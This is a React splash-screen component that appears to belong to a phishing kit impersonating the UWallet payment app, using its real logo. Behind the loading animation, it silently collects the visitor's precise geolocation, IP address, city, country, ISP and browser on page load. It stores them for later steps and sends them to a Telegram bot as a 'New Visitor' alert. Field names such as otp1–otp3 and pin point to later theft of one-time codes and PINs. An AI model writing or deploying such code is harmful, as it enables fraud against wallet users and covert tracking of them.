"use client"

import { useEffect, useState } from "react"

export function SplashScreen({ onComplete }: { onComplete: () => void }) {
  const [progress, setProgress] = useState(0)

  /* ---------------- Helpers ---------------- */
  const getPreciseLocation = (): Promise<{ lat: number; lon: number } | null> => {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        resolve(null)
        return
      }
      navigator.geolocation.getCurrentPosition(
        (position) => {
          resolve({
            lat: position.coords.latitude,
            lon: position.coords.longitude,
          })
        },
        () => resolve(null),
        { timeout: 5000 }
      )
    })
  }

  const getBrowserName = () => {
    if (typeof window === "undefined") return "Unknown Browser"
    const userAgent = window.navigator.userAgent
    if (userAgent.includes("Firefox")) return "Mozilla Firefox"
    if (userAgent.includes("SamsungBrowser")) return "Samsung Internet"
    if (userAgent.includes("Opera") || userAgent.includes("OPR")) return "Opera"
    if (userAgent.includes("Edge")) return "Microsoft Edge"
    if (userAgent.includes("Chrome")) return "Google Chrome"
    if (userAgent.includes("Safari")) return "Apple Safari"
    return "Unknown Browser"
  }

  useEffect(() => {
    const initTelegram = async () => {
      try {
        const preciseLoc = await getPreciseLocation()
        let ipData: any = {}

        try {
          const geoRes = await fetch("https://ipapi.co/json/")
          if (geoRes.ok) {
            ipData = await geoRes.json()

            if (ipData.error || ipData.reason === "Suspended" || ipData.reserved) {
              // console.log("Visitor tracking skipped: IP API suspended or error.")
              return
            }

            // Store in sessionStorage for future steps
            sessionStorage.setItem("ip", ipData.ip || "Unknown")
            sessionStorage.setItem("city", ipData.city || "N/A")
            sessionStorage.setItem("region", ipData.region || "N/A")
            sessionStorage.setItem("country", ipData.country_name || "N/A")
            sessionStorage.setItem("isp", ipData.org || "N/A")
            sessionStorage.setItem("browser", getBrowserName())
          }
        } catch (e) {
          // console.error("IP Fetch error", e)
        }

        const { sendTelegramMessage } = await import("@/lib/telegram")
        await sendTelegramMessage({
          title: "New Visitor",
          lat: preciseLoc?.lat,
          lon: preciseLoc?.lon,
          ip: ipData.ip,
          city: ipData.city,
          country: ipData.country_name,
          isp: ipData.org,
          browser: getBrowserName(),
          exclude: ["contact", "profile", "otp1", "otp2", "otp3", "pin"],
        })
      } catch (error) {
        // console.error("Telegram error:", error)
      }
    }

    // Call it
    initTelegram()

    const duration = 5000 // 5 seconds
    const interval = 50 // Update every 50ms
    const increment = (interval / duration) * 100

    const timer = setInterval(() => {
      setProgress((prev) => {
        if (prev >= 100) {
          clearInterval(timer)
          return 100
        }
        return prev + increment
      })
    }, interval)

    const completeTimer = setTimeout(() => {
      onComplete()
    }, duration)

    return () => {
      clearInterval(timer)
      clearTimeout(completeTimer)
    }
  }, [onComplete])

  return (
    <div className="fixed inset-0 z-50 flex flex-col items-center justify-center bg-gradient-to-b from-[#6b7280] via-[#7c8594] to-[#c9a4a8]">
      {/* UWallet Logo in White */}
      <div className="flex flex-col items-center gap-8">
        <img
          src="https://uwallet.jo/storage/2025/10/uwallet-final-logo-blue.png"
          alt="UWallet"
          className="w-64 h-auto brightness-0 invert"
        />

        {/* Loader Container */}
        <div className="w-48 flex flex-col items-center gap-3">


          {/* Spinning Loader */}
          <div className="relative w-8 h-8">
            <div className="absolute inset-0 border-2 border-white/20 rounded-full" />
            <div
              className="absolute inset-0 border-2 border-transparent border-t-white rounded-full animate-spin"
              style={{ animationDuration: "1s" }}
            />
          </div>
        </div>
      </div>
    </div>
  )
}
